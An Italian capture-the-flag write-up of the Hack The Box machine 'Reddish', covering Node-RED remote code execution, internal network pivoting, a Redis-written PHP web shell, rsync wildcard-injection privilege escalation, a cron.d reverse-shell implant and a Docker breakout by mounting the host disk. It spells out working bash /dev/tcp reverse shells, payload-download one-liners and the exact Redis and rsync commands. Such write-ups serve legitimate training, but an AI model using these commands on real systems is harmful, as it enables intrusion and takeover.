+++
date = '2026-07-18T17:30:35+02:00'
draft = false
title = 'Reddish Writeup IT'
+++
**Nome**: **`joy.scd01`**

**Data**: **`18/07/2026`**

![Reddish.jpeg](/images/imgs_reddish/Reddish.jpeg)

---
# Introduzione

**_Reddish_** è una macchina **Linux** di difficoltà **Insane** incentrata sulla mappatura della rete interna, pivoting avanzato e Docker container breakouts.

L'exploitation path inizia ottenendo l'accesso ad un container **Docker** tramite un'istanza vulnerabile di **Node-RED**. Una volta dentro, la difficoltà si sposta sull'enumerazione della rete interna.
I lateral movement richiedono l'abuso di un'istanza **Redis** per scrivere un file **PHP** malevolo all'interno di una cartella condivisa, ottenendo **RCE** su un container web separato. Da qui, una **Wildcard expansion** tramite **rsync** porta alla privesc all'interno del secondo container. Infine, un'errata configurazione di **Rsync** viene sfruttata per caricare un cronjob malevolo su un container di backup, permettendomi di pivotare in esso e montare il disco fisico dell'host per leggere la **root flag**.

---
# Tecniche Utilizzate

- **Node-RED RCE**

- **Internal Network Pivoting & Port Forwarding**

- **Redis Arbitrary File Write**

- **Rsync Wildcard Expansion**

- **Cronjob Hijacking**

- **Docker Container Breakout**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- reddish
```

```text
PORT     STATE SERVICE
1880/tcp open  vsat-control
```

**Porte Aperte**:

- **1880**/tcp - Node-RED / Web

## Enumerazione Web 

Visitando l'applicazione sulla porta **1880** veniva restituito un semplice messaggio: "**`Cannot GET /`**".

![browser.png](/images/imgs_reddish/browser.png)

Dopo aver lanciato **gobuster**, ho provato a interagire con le richieste e ho trovato un endpoint interessante inviando una **`POST`** con **curl**:

```bash
curl -X POST http://reddish:1880
```

![curl.png](/images/imgs_reddish/curl.png)

Navigando su **`http://reddish:1880/red/420145ed5986d48d8b85490d3a376a8a`** è presente un'istanza di **Node-RED**.

![nodered.png](/images/imgs_reddish/nodered.png)

**Nota**: _Secondo il sito ufficiale di **Nodered**, Quest'ultima è una piattaforma di sviluppo flow-based progettata per semplificare l'integrazione tra sistemi, API, servizi e dispositivi attraverso un'interfaccia visiva. Creata originariamente da **IBM** e attualmente mantenuta dalla **OpenJS Foundation**, **Node-RED** è ampiamente utilizzata in scenari di automazione, Internet of Things (**IoT**), integrazione di servizi e orchestrazione di dati._

---
# Accesso Iniziale | Node-RED RCE

Cercando online, ho trovato un articolo che spiegava una nota **RCE** in **Node-RED**:

- **`https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/`**

**Nota**: _Di default, **Node-RED** non richiede autenticazione. Questo significa che chiunque può interagire con l'interfaccia visiva e trascinare un blocco "**`exec`**" nel flow per eseguire comandi arbitrari sul server sottostante._

Inizialmente ho provato a utilizzare l'exploit in Python fornito dalla guida, ma non sono riuscito a farlo funzionare.

![script_fail.png](/images/imgs_reddish/script_fail.png)

Così, ho deciso di costruire l'exploit manualmente utilizzando l'interfaccia di **Node-RED**.

Ho impostato un flow molto semplice:
- **`inject block`** ➔ **`exec block`** (che esegue il comando **`id`**) ➔ **`debug block`**.

![nouser.png](/images/imgs_reddish/nouser.png)

![id_rce.png](/images/imgs_reddish/id_rce.png)

Ho notato un comportamento molto interessante: se aggiungevo **`msg.payload`**, il comando veniva eseguito come l'attuale utente, ma se lo lanciavo senza aggiungerlo, il comando veniva eseguito come **root**:

Ho confermato questa cosa riuscendo a leggere il file **`/etc/passwd`**.

![passwd.png](/images/imgs_reddish/passwd.png)

Dato che potevo eseguire comandi sul server, ho provato a ottenere una reverse shell direttamente dall'interfaccia web. Dopo aver giocato parecchio con i vari blocchi per capirne il funzionamento, ho creato un nuovo flow:
- **`tcp input block`** ➔ **`exec block`** ➔ **`tcp output block`**.

Ho impostato il primo **`TCP block`** per connettersi al mio **IP**. Nel blocco **`exec`**, ho inserito la classica reverse shell in bash:
- **`bash -c "bash -i >& /dev/tcp/<attacker_ip>/<port>&1"`**.
Infine, ho settato il **`TCP output`** su "**`reply to tcp`**".

![rev_fail1.png](/images/imgs_reddish/rev_fail1.png)

Ho triggerato il flow diverse volte. Ricevevo effettivamente una connessione sul mio listener, ma la shell per qualche motivo si rompeva. Ogni volta che digitavo un comando, ricevevo immediatamente un errore "**`Connection refused`**":

![rev_fail2.png](/images/imgs_reddish/rev_fail2.png)

A questo punto ho deciso di tornare indietro, riprovare l'exploit iniziale in **Python** e cercare di debuggarlo.

L'esecuzione dello script restituiva diversi **`asyncio` deprecation warnings** e crashava del tutto con un **JSON parsing error**:

```python
python3 scr.py http://reddish:1880/red/420145ed5986d48d8b85490d3a376a8a
[+] Node-RED does not require authentication.
[+] Establishing RCE link ....
> id
Traceback (most recent call last):
  File "/home/fallingstar/HTB/Machines/Reddish/scr.py", line 254, in exploit
    if "topic" in message and message["topic"] == "debug":
                              ~~~~~~~^^^^^^^^^
TypeError: string indices must be integers, not 'str'
```

Per risolvere la cosa in fretta, ho usato un'**IA** per debuggare l'errore. Questa ha modificato la logica di parsing dello script per estrarre correttamente i dati di output dall'oggetto JSON innestato:

![scriptcorrection.png](/images/imgs_reddish/scriptcorrection.png)

Con l'exploit fixato, la connessione web socket si è stabilizzata.

```bash
python3 noderedsh.py http://reddish:1880/red/420145ed5986d48d8b85490d3a376a8a
```

![rce.png](/images/imgs_reddish/rce.png)

Da lì, ho eseguito una one-liner in bash ottenendo la shell sul mio listener **netcat**:

![rootnod.png](/images/imgs_reddish/rootnod.png)

Ero dentro il primo container **Docker** (**`node-red`**) come **root**.

---
# Enumerazione Rete Interna

Controllando le interfacce di rete con **`ip a`**, ho scoperto la subnet interna: **`172.19.0.0/16`**.

![ipa.png](/images/imgs_reddish/ipa.png)

Sono partito a mappare la rete interna utilizzando un metodo molto grezzo : un semplice **ping sweep** manuale.

```bash
ping -c 3 172.19.0.1
ping -c 3 172.19.0.2
ping -c 3 172.19.0.3
ping -c 4 172.19.0.4
```

![pings.png](/images/imgs_reddish/pings.png)

Tutti rispondevano, tranne il **`.5`**. A questo punto avevo bisogno degli strumenti giusti per capire cosa girasse su questi host quindi sono passato a **Metasploit**.

Ho generato un payload **meterpreter** malevolo in locale:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.77 LPORT=22667 -f elf >> fall.sh
```

![payload.png](/images/imgs_reddish/payload.png)

Poi, dato che il container era abbastanza spoglio e non avevo tool come **`curl`**, **`wget`** o **`nc`**, ho utilizzato **Node.js** per trasferirlo:

**Nota**: _Questa scelta non è stata casuale. Sapendo di essere dentro un container **Docker** che fa girare un'istanza **Node-RED**, **node** doveva esserci per forza. Invece di tirare a indovinare o perdere tempo a mappare i tool presenti nel sistema, ho semplicemente cercato come trasferire un file usando **Node.js** e ho trovato questa comoda one-liner._

```bash
node -e "const http = require('http'); const fs = require('fs'); const file = fs.createWriteStream('fall.sh'); http.get('http://10.10.16.77:8000/fall.sh', function(response) { response.pipe(file); });"
```

![nodetransfer.png](/images/imgs_reddish/nodetransfer.png)

![meterpreter.png](/images/imgs_reddish/meterpreter.png)

Una volta stabilita la sessione **Meterpreter**, ho mappato la rete interna usando **`/post/multi/manage/autoroute`** e ho lanciato il modulo **`scanner/portscan/tcp`** contro **`172.19.0.0/24`**.

```text
msf auxiliary(scanner/portscan/tcp) > run 
[*] 172.19.0.0            - Scanned 1 of 1 hosts (100% complete)
[+] 172.19.0.2            - 172.19.0.2:6379 - TCP OPEN
[+] 172.19.0.3            - 172.19.0.3:1880 - TCP OPEN
[+] 172.19.0.4            - 172.19.0.4:80 - TCP OPEN
```

Ho fatto una rapida ricerca su **Google** per la porta **6379** e questo ha confermato che si trattava della porta TCP di default utilizzata da un server **Redis**.

**Mappatura Target**:

- **`172.19.0.3`** - **Container Node-RED corrente** (**1880**)

- **`172.19.0.2`** - **Server Redis** (**6379**)

- **`172.19.0.4`** - **Web server** (**80**)

---
# Lateral Movement | Redis Exploitation → Web RCE

Avrei potuto usare **Metasploit** per fare port forwarding, ma come al solito preferisco provare le cose manualmente. Ho scaricato un binario statico di **ncat**, l'ho trasferito via **Node.js** e mi sono connesso direttamente a **Redis**:

```bash
chmod +x ncat 
./ncat 172.19.0.2 6379
```

![ncat_redis.png](/images/imgs_reddish/ncat_redis.png)

A questo punto ero completamente bloccato. Ho cercato delle **CVE** relative a **Redis** ma non ho trovato nulla di direttamente sfruttabile. Ho passato un po' di tempo a smanettare con le sue funzioni; sapevo che potevo **creare chiavi**, **rinominare file** e **cambiare percorsi**, ma non riuscivo ad andare avanti.

Quindi, ho fatto un passo indietro e ho deciso di analizzare l'altra macchina interna: il server web sul **`172.19.0.4`**.
Per raggiungerlo, ho usato di nuovo l'applicazione **Node-RED**. 

Ho creato un flow:

- **`http input (/fall)`** ➔ **`http request (http://172.19.0.4:80)`** ➔ **`http response`**.

![httpinput.png](/images/imgs_reddish/httpinput.png)
![httpreq.png](/images/imgs_reddish/httpreq.png)

Dopo aver cliccato su deploy, ho raggiunto il **server web** all'indirizzo:
- **`http://reddish:1880/api/<id>/fall`**.

![webserver.png](/images/imgs_reddish/webserver.png)

Ispezionando il codice sorgente, ho notato un grandissimo indizio: una **TODO** list lasciata dagli sviluppatori:

![sourcecodehint.png](/images/imgs_reddish/sourcecodehint.png)

Questa era la chiave per la **RCE**. Il **web server** e il container del database (**Redis**) condividevano la stessa **cartella web** (**`/var/www/html/`**). Dato che il **web server** esegue codice **PHP** e io avevo accesso a **Redis**, potevo usarlo per creare un file malevolo e dropparlo nella **cartella web**.

```bash
./ncat 172.19.0.2 6379
SET cmd "<?php echo SYSTEM($_REQUEST['star']) ?>"
config set dbfilename "fall.php"
config set dir "/var/www/html"
save
```

![redisexploit.png](/images/imgs_reddish/redisexploit.png)

Ho accodato **`fall.php?star=whoami`** alla richiesta **HTTP** su **Node-RED**, ne ho fatto il deploy e finalmente ho ottenuto l'output del comando **`whoami`**.

![noderedrce.png](/images/imgs_reddish/noderedrce.png)
![noderedrce2.png](/images/imgs_reddish/noderedrce2.png)

Per ottenere una shell stabile, ho inviato un payload per una reverse shell **URL-encoded**:

```text
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.3%2F22666%200%3E%261%27
```

In ascolto sul container **`node-red`**, ho catturato la reverse shell come **`www-data`**.

![wwwcontainer.png](/images/imgs_reddish/wwwcontainer.png)

**Nota**: _Questo è stato uno dei primi punti di pivoting veramente tosti. Mi ha dato un bel po' di problemi. Come vedremo più avanti nella macchina, c'è un cronjob in esecuzione sul container **`www`** che cancella periodicamente l'intero contenuto di **`/var/www/html/`**, il che significa che la nostra shell **PHP** viene costantemente eliminata. Piccolo hint che ho scoperto facendola: se la vostra shell viene eliminata, non c'è bisogno di ridare tutti i comandi **Redis** per ricrearla. La configurazione di **Redis** rimane in memoria, quindi basta semplicemente digitare di nuovo **`save`** nella sessione di **ncat** per droppare all'istante il file **PHP** nella web directory._

---
# Privilege Escalation | Rsync Wildcard Expansion

All'interno del container **`www`**, ho enumerato il file system e ho trovato tre utenti in **`/home`**:
- **`bergamotto`**
- **`lost+found`**
- **`somaro`**.

Più a fondo, dopo ore di enumerazione locale, ho scoperto uno script **`backup.sh`** posizionato dentro la cartella **`/backup`** ed eseguito da **root**:

![privescvuln.png](/images/imgs_reddish/privescvuln.png)


All'inizio ho provato a connettermi semplicemente alla share **rsync** per vedere se potevo leggere o scrivere file, ma la connessione è stata rifiutata a causa dei permessi.
Tuttavia, l'uso della wildcard **`*.rdb`** nello script lo rendeva vulnerabile ad una **Wildcard Expansion**. Per sfruttarla, ho avviato un listener **netcat** su **`node-red`** e ho creato due file specifici:

```bash
echo "stars" > '-e sh test.rdb';
echo "bash -c 'bash -i >& /dev/tcp/172.19.0.4/22555 0>&1'" > test.rdb
```

**Nota**: _Quando il cronjob esegue lo script, la shell Bash espande la wildcard **`*.rdb`** prima di passare gli argomenti a **rsync**. Sostituisce la wildcard con i nomi di tutti i file corrispondenti nella directory corrente. 

_Avendo creato un file che si chiama letteralmente **`-e sh test.rdb`**, il comando eseguito dal sistema diventa di fatto:_

- **`rsync -a -e sh test.rdb test.rdb rsync://backup:873/src/rdb/`**

_In **rsync**, il flag **`-e`** viene usato per specificare il programma shell remoto (di solito **SSH**). Iniettando **`-e sh test.rdb`**, forziamo **rsync** a usare il nostro file **`test.rdb`** come file eseguibile._

![privesc.png](/images/imgs_reddish/privesc.png)

Quando il cronjob ha eseguito lo script, **rsync** ha interpretato i miei file come flags. Ho ricevuto la connessione come **root** sul container **`www`**.

![userflag.png](/images/imgs_reddish/userflag.png)

In **`/home/somaro`**, ho preso la **user flag**.

---
# Container Breakout | Cronjob Hijacking → Host root

Ora che ero **root** sul container web, avevo i permessi per connettermi a **rsync**.

```bash
rsync -v rsync://backup:873/src/backup/
rsync -v rsync://backup:873/src/
rsync -v rsync://backup:873/src/docker-entrypoint.sh .
```

![rsync.png](/images/imgs_reddish/rsync.png)

Ho scaricato **`docker-entrypoint.sh`** per vedere cosa succedesse all'interno del container **`backup`**:

```bash
cat docker-entrypoint.sh
```

![entrypoint.png](/images/imgs_reddish/entrypoint.png)

Lo script mostrava chiaramente che veniva lanciato **`service cron start`** all'avvio del docker. Questo significava che se fossi riuscito a creare un cronjob, avrei potuto pivotare sul container di **`backup`**.

Per farlo, dovevo creare un tunnel. Ho trasferito **socat** sul container **node-red** per instradare il traffico verso la mia macchina Kali:

```bash
node -e "const http = require('http'); const fs = require('fs'); const file = fs.createWriteStream('socat'); http.get('http://10.10.16.77:8000/socat', function(response) { response.pipe(file); });"
./socat TCP4-LISTEN:1234,fork TCP4:10.10.16.77:1234 &
```

**Node.js** non era presente sul container **`www`**.

**Nota**: _Questo è stato un altro enorme ostacolo. Non avevo **`wget`**, **`curl`**, **`nc`**, e questa volta non avevo nemmeno **`node`** per il trasferimento dei file. Ho passato un bel po' di tempo a enumerare i binari disponibili prima di realizzare che sul sistema era installato **`perl`**._

Così l'ho usato per scaricare **ncat** attraverso il tunnel:

```bash
perl -e 'use File::Fetch;$url="http://172.19.0.3:1234/ncat";$ff=File::Fetch->new(uri => $url);$file=$ff->fetch() or die $ff->error;'
chmod +x ncat
```

![ncatpivot.png](/images/imgs_reddish/ncatpivot.png)

Poi, ho creato il file con il cronjob malevolo in locale e ho usato **rsync** per pusharlo nella cartella **`/etc/cron.d/`** del container di **`backup`**:

```bash
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/172.19.0.4/8888 0>&1'" > fall;
rsync -v fall rsync://backup:873/src/etc/cron.d/fall
```

Ho controllato se il comando **rsync** avesse funzionato correttamente:

```bash
rsync -v rsync://backup:873/src/etc/cron.d/
```

Ho avviato un listener su **`www`** e ho ricevuto una connessione come **root** sul container di **`backup`**.

![rsync2.png](/images/imgs_reddish/rsync2.png)

Non trovando la **root flag** da nessuna parte, mi sono reso conto che ero ancora all'interno di un container.

![rootflagfail.png](/images/imgs_reddish/rootflagfail.png)

Così, ho ispezionato i dischi fisici in **`/dev`**:

![devsda.png](/images/imgs_reddish/devsda.png)

Montando **`/dev/sda2`** ho avuto accesso al file system dell'host sottostante e ho preso la **root flag**.

```bash
ls -lha /dev/sd*
mount /dev/sda1 /mnt  # nothing here
mount /dev/sda2 /mnt
cd /mnt/root
cat root.txt
```

![rootflag.png](/images/imgs_reddish/rootflag.png)

---
# Considerazioni Finali

A parte gli IP che si incasinano quando reverti la macchina, un capolavoro assoluto. **_Reddish_** è un incubo puro di routing e pivoting nel vero senso della parola.

Dover saltare tra **Node-RED**, autorouting di **Metasploit**, **Redis** e **Rsync** tenendo traccia di molteplici container **Docker** richiede un bel po' di organizzazione. L'exploitation path scorre in modo perfetto: da una classica **RCE** allo sfruttamento di una cartella condivisa tra container, passando per wildcard expansions, e infine abusando delle configurazioni di **rsync** per caricare il cronjob.

Il badge di completamento con la tag di rarità **`0.04% of users`** è la ricompensa perfetta dopo 3 giorni di puro inferno.

![badge.jpeg](/images/imgs_reddish/badge.jpeg)